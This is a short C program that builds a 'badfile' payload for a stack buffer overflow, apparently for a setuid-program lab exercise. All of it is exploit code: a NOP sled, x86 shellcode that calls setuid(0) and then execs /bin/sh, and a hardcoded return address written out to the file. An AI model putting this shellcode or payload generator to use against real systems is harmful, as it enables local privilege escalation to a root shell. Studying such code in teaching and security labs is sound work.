#include<stdio.h>
#include<string.h>

char ret_addr[] = "\x60\xef\xff\xbf";
char seteuid_shellcode[] = "\x31\xdb"           
    "\x6a\x17"                 
    "\x58"                    
    "\xcd\x80"                
    "\xf7\xe3"                
    "\xb0\x0b"                  
    "\x31\xc9"                  
    "\x51"                      
    "\x68\x2f\x2f\x73\x68"     
    "\x68\x2f\x62\x69\x6e"      
    "\x89\xe3"                  
    "\xcd\x80";

char nop[] = "\x90";

int main(){
	FILE* badf;
	badf = fopen("badfile","w");
	char buff[517];
	int ind = 0;
	for(;ind<384;ind++)
		buff[ind] = nop[0];
	for(int i=0;i<strlen(seteuid_shellcode);i++){
		buff[ind++] = seteuid_shellcode[i];
	}
	for(int i=0;i<strlen(ret_addr);i++){
		buff[ind++] = ret_addr[i];
	}
//	printf("%d %d",strlen(root_shell), strlen(shutdown_shellcode));
	
	//buff[ind] = '\0';
	fwrite(buff,517,1,badf);
	return 0;
}
